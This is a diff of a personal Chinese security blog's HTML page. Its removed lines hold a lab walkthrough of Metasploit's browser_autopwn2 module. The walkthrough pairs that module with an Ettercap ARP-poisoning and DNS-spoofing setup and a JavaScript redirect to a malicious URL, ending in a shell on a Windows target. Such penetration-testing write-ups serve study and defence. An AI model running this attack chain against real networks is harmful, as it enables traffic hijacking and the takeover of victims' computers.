@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="Metasploit,浏览器攻击,">
+  <meta name="keywords" content="Hexo, NexT">
 
 
 
@@ -79,21 +79,13 @@
 
 
 
-<meta name="description" content="一、介绍browser_autopwn是Metasploit提供的辅助功能模块。在用户访问Web页面时，它会自动攻击受害者的浏览器。在开始攻击之前，browser_autopwn能够检测用户使用的浏览器类型，自动部署最合适的exploit。">
-<meta name="keywords" content="Metasploit,浏览器攻击">
-<meta property="og:type" content="article">
-<meta property="og:title" content="Metasploit利用-浏览器自动攻击">
-<meta property="og:url" content="https://jeremyekek.github.io/2019/04/08/Metasploit利用-浏览器自动攻击/index.html">
+<meta property="og:type" content="website">
+<meta property="og:title" content="EkEk的个人博客">
+<meta property="og:url" content="https://jeremyekek.github.io/categories/漏洞复现/index.html">
 <meta property="og:site_name" content="EkEk的个人博客">
-<meta property="og:description" content="一、介绍browser_autopwn是Metasploit提供的辅助功能模块。在用户访问Web页面时，它会自动攻击受害者的浏览器。在开始攻击之前，browser_autopwn能够检测用户使用的浏览器类型，自动部署最合适的exploit。">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="https://jeremyekek.github.io/2019/04/08/Metasploit利用-浏览器自动攻击/1554724873153.png">
-<meta property="og:image" content="https://jeremyekek.github.io/2019/04/08/Metasploit利用-浏览器自动攻击/1554725111543.png">
-<meta property="og:updated_time" content="2019-04-14T02:02:16.372Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Metasploit利用-浏览器自动攻击">
-<meta name="twitter:description" content="一、介绍browser_autopwn是Metasploit提供的辅助功能模块。在用户访问Web页面时，它会自动攻击受害者的浏览器。在开始攻击之前，browser_autopwn能够检测用户使用的浏览器类型，自动部署最合适的exploit。">
-<meta name="twitter:image" content="https://jeremyekek.github.io/2019/04/08/Metasploit利用-浏览器自动攻击/1554724873153.png">
+<meta name="twitter:title" content="EkEk的个人博客">
 
 
 
@@ -123,13 +115,13 @@
 
 
 
-  <link rel="canonical" href="https://jeremyekek.github.io/2019/04/08/Metasploit利用-浏览器自动攻击/">
+  <link rel="canonical" href="https://jeremyekek.github.io/categories/漏洞复现/">
 
 
 
 
 
-  <title>Metasploit利用-浏览器自动攻击 | EkEk的个人博客</title>
+  <title>分类: 漏洞复现 | EkEk的个人博客</title>
   
 
 
@@ -148,7 +140,7 @@
     
   
 
-  <div class="container sidebar-position-right page-post-detail">
+  <div class="container sidebar-position-right ">
     <div class="headband"></div>
     <!-- GitHub-start -->
     <a href="https://your-url" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewbox="0 0 250 250" style="fill:#64CEAA; color:#fff; position: absolute; top: 0; border: 0; left: 0; transform: scale(-1, 1);" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"/><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"/><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"/></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
@@ -244,249 +236,53 @@
           <div id="content" class="content">
             
 
-  <div id="posts" class="posts-expand">
-    
+  
+  
+  
+  <div class="post-block category">
 
-  
+    <div id="posts" class="posts-collapse">
+      <div class="collection-title">
+        <h1>漏洞复现<small>分类</small>
+        </h1>
+      </div>
 
-  
-  
-  
+      
+        
 
   <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://jeremyekek.github.io/2019/04/08/Metasploit利用-浏览器自动攻击/">
+    <header class="post-header">
 
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="EkEk">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="EkEk的个人博客">
-    </span>
-
-    
-      <header class="post-header">
-
+      <h2 class="post-title">
         
+            <a class="post-title-link" href="/2019/03/16/Metasploit利用-WinRAR远程代码执行漏洞复现/" itemprop="url">
+              
+                <span itemprop="name">利用MSF复现WinRAR远程代码执行漏洞</span>
+              
+            </a>
         
-          <h1 class="post-title" itemprop="name headline">Metasploit利用-浏览器自动攻击</h1>
-        
+      </h2>
 
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-04-08T20:09:10+08:00">
-                2019-04-08
-              </time>
-            
+      <div class="post-meta">
+        <time class="post-time" itemprop="dateCreated" datetime="2019-03-16T10:22:52+08:00" content="2019-03-16">
+          03-16
+        </time>
+      </div>
 
-            
-
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/学习笔记/" itemprop="url" rel="index">
-                    <span itemprop="name">学习笔记</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-              <span class="post-comments-count">
-                <span class="post-meta-divider">|</span>
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-comment-o"></i>
-                </span>
-                <a href="/2019/04/08/Metasploit利用-浏览器自动攻击/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2019/04/08/Metasploit利用-浏览器自动攻击/" itemprop="commentCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        <h2 id="一、介绍"><a href="#一、介绍" class="headerlink" title="一、介绍"></a>一、介绍</h2><p>browser_autopwn是Metasploit提供的辅助功能模块。在用户访问Web页面时，它会自动攻击受害者的浏览器。在开始攻击之前，browser_autopwn能够检测用户使用的浏览器类型，自动部署最合适的exploit。</p>
-<a id="more"></a>
-<h2 id="二、测试环境"><a href="#二、测试环境" class="headerlink" title="二、测试环境"></a>二、测试环境</h2><ul>
-<li><p>本地局域网络</p>
-</li>
-<li><p>Kali</p>
-</li>
-<li><p>Windows Server 2003 / xp </p>
-</li>
-</ul>
-<h2 id="三、使用工具"><a href="#三、使用工具" class="headerlink" title="三、使用工具"></a>三、使用工具</h2><ul>
-<li><p>Metasploit</p>
-</li>
-<li><p>Ettercap</p>
-</li>
-</ul>
-<h2 id="四、Exp"><a href="#四、Exp" class="headerlink" title="四、Exp"></a>四、Exp</h2><p>browser_autopwn2</p>
-<h2 id="五、目的"><a href="#五、目的" class="headerlink" title="五、目的"></a>五、目的</h2><p>如果在同一局域网，目标机器上没有可成功利用的端口时，我们可以尝试进行浏览器攻击。首先，在局域网中使用DNS欺骗，将用户的流量劫持到指定的站点，访问该站点页面会自动跳转至我们构造好的恶意URL上，然后获得反弹shell，这样就能达到获取权限目的。</p>
-<h2 id="六、服务端准备"><a href="#六、服务端准备" class="headerlink" title="六、服务端准备"></a>六、服务端准备</h2><h3 id="1-启动MSF"><a href="#1-启动MSF" class="headerlink" title="1. 启动MSF"></a>1. 启动MSF</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/postgresql start	//启动msf框架所依赖的数据库</span><br><span class="line">msfconsole						//启动msfconsole</span><br></pre></td></tr></table></figure>
-<h3 id="2-加载Exp"><a href="#2-加载Exp" class="headerlink" title="2. 加载Exp"></a>2. 加载Exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">search browser_autopwn2		//搜索browser_autopwn2模块</span><br><span class="line">use auxiliary/server/browser_autopwn2	//使用该模块</span><br><span class="line">show options		//查看参数，可默认无需修改</span><br><span class="line">set					//查看设置内容</span><br><span class="line">run					//启动模块</span><br></pre></td></tr></table></figure>
-<p>等待出现URL，和 Server started</p>
-<h3 id="3-构造恶意URL"><a href="#3-构造恶意URL" class="headerlink" title="3. 构造恶意URL"></a>3. 构造恶意URL</h3><p>在Apache中写上自动跳转的代码，向恶意URL上跳转</p>
-<p>这里采用javascript实现：</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">"javascript"</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"> </span></span><br><span class="line"><span class="undefined">// 以下方式定时跳转</span></span><br><span class="line"><span class="undefined">setTimeout("javascript:location.href='http://192.168.10.3:8080/Y3JY6DI6gql5iSu'", 5000); </span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<h3 id="5-启动站点服务"><a href="#5-启动站点服务" class="headerlink" title="5.启动站点服务"></a>5.启动站点服务</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/apache2 start</span><br></pre></td></tr></table></figure>
-<h2 id="七、攻击客户端"><a href="#七、攻击客户端" class="headerlink" title="七、攻击客户端"></a>七、攻击客户端</h2><h3 id="1-DNS欺骗"><a href="#1-DNS欺骗" class="headerlink" title="1. DNS欺骗"></a>1. DNS欺骗</h3><p><strong>使用Ettercap</strong></p>
-<ol>
-<li><p>打开Ettercap的 DNS文件，</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/ettercap/etter.dns</span><br></pre></td></tr></table></figure>
-<p>添加欺骗的A记录和PTR（反向）记录</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">www.*.com	A	192.168.10.3</span><br><span class="line">www.*.com	PTR	192.168.10.3</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>kali中输入ettercap -G 进入该工具的图形化界面 </p>
-<p>菜单栏选择sniff –&gt; Unified sniffing –&gt;选择上网网卡 </p>
-<p>菜单栏选择Hosts –&gt; Scan for Hosts –&gt; 再点击host list</p>
-<ul>
-<li><p>选择欺骗目标的网关  添加到target1</p>
-</li>
-<li><p>选择欺骗目标的IP 添加到target2</p>
-</li>
-</ul>
-<p>菜单栏选择Mitm–&gt;ARP poisoning–&gt;勾选Sniff remote connections（ARP欺骗）</p>
-<p>菜单栏选择Plugins–&gt;Manage the plugins–&gt;选择dns-spoof（dns欺骗）</p>
-<p>最后，菜单栏中找到start–&gt;start sniffing</p>
-</li>
-</ol>
-<h3 id="2-等待目标使用浏览器"><a href="#2-等待目标使用浏览器" class="headerlink" title="2. 等待目标使用浏览器"></a>2. 等待目标使用浏览器</h3><ol>
-<li><p>目标地址访问任意符合该URL的页面：www.***.com，即可成功跳转至恶意URL</p>
-</li>
-<li><p>访问我们的恶意页面后，该模块会自动选择最合适的exploit，进行攻击利用</p>
-</li>
-<li><p>等待一段时间，直到出现 Successfully migrated to process</p>
-<p><img src="/2019/04/08/Metasploit利用-浏览器自动攻击/1554724873153.png" alt="1554724873153"></p>
-</li>
-<li><p>查看session</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sessions -l</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>选择相应序号</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sessions -i 1</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>getshell</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br></pre></td></tr></table></figure>
-<p><img src="/2019/04/08/Metasploit利用-浏览器自动攻击/1554725111543.png" alt="1554725111543"></p>
-</li>
-</ol>
-
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-        <div class="post-tags">
-          
-            <a href="/tags/Metasploit/" rel="tag"># Metasploit</a>
-          
-            <a href="/tags/浏览器攻击/" rel="tag"># 浏览器攻击</a>
-          
-        </div>
-      
-
-      
-      
-      
-
-      
-        <div class="post-nav">
-          <div class="post-nav-next post-nav-item">
-            
-              <a href="/2019/04/07/逻辑漏洞挖掘思路-支付逻辑/" rel="next" title="逻辑漏洞挖掘思路-支付逻辑">
-                <i class="fa fa-chevron-left"></i> 逻辑漏洞挖掘思路-支付逻辑
-              </a>
-            
-          </div>
-
-          <span class="post-nav-divider"></span>
-
-          <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/04/28/docker入门-环境部署实例/" rel="prev" title="docker入门&&环境部署实例">
-                docker入门&&环境部署实例 <i class="fa fa-chevron-right"></i>
-              </a>
-            
-          </div>
-        </div>
-      
-
-      
-      
-    </footer>
-  </div>
-  
-  
-  
+    </header>
   </article>
 
 
-
-    <div class="post-spread">
       
     </div>
+
   </div>
+  
+  
+  
+
+  
+
 
 
           </div>
@@ -494,20 +290,6 @@
 
 
           
-
-  
-    <div class="comments" id="comments">
-      <div id="disqus_thread">
-        <noscript>
-          Please enable JavaScript to view the
-          <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
-        </noscript>
-      </div>
-    </div>
-
-  
-
-
 
         </div>
         
@@ -528,17 +310,8 @@
       
 
       
-        <ul class="sidebar-nav motion-element">
-          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
-            文章目录
-          </li>
-          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
-            站点概览
-          </li>
-        </ul>
-      
 
-      <section class="site-overview-wrap sidebar-panel">
+      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -753,22 +526,6 @@
       </section>
 
       
-      <!--noindex-->
-        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
-          <div class="post-toc">
-
-            
-              
-            
-
-            
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#一、介绍"><span class="nav-text">一、介绍</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#二、测试环境"><span class="nav-text">二、测试环境</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#三、使用工具"><span class="nav-text">三、使用工具</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#四、Exp"><span class="nav-text">四、Exp</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#五、目的"><span class="nav-text">五、目的</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#六、服务端准备"><span class="nav-text">六、服务端准备</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-启动MSF"><span class="nav-text">1. 启动MSF</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-加载Exp"><span class="nav-text">2. 加载Exp</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-构造恶意URL"><span class="nav-text">3. 构造恶意URL</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-启动站点服务"><span class="nav-text">5.启动站点服务</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#七、攻击客户端"><span class="nav-text">七、攻击客户端</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-DNS欺骗"><span class="nav-text">1. DNS欺骗</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-等待目标使用浏览器"><span class="nav-text">2. 等待目标使用浏览器</span></a></li></ol></li></ol></div>
-            
-
-          </div>
-        </section>
-      <!--/noindex-->
-      
 
       
 
@@ -902,10 +659,6 @@
 
 
   
-  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
-<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
-
-
 
   
 
@@ -923,18 +676,6 @@
       <script id="dsq-count-scr" src="https://jeremyekek-github-io.disqus.com/count.js" async></script>
     
 
-    
-      <script type="text/javascript">
-        var disqus_config = function () {
-          this.page.url = 'https://jeremyekek.github.io/2019/04/08/Metasploit利用-浏览器自动攻击/';
-          this.page.identifier = '2019/04/08/Metasploit利用-浏览器自动攻击/';
-          this.page.title = 'Metasploit利用-浏览器自动攻击';
-        };
-        var d = document, s = d.createElement('script');
-        s.src = 'https://jeremyekek-github-io.disqus.com/embed.js';
-        s.setAttribute('data-timestamp', '' + +new Date());
-        (d.head || d.body).appendChild(s);
-      </script>
     
 
   
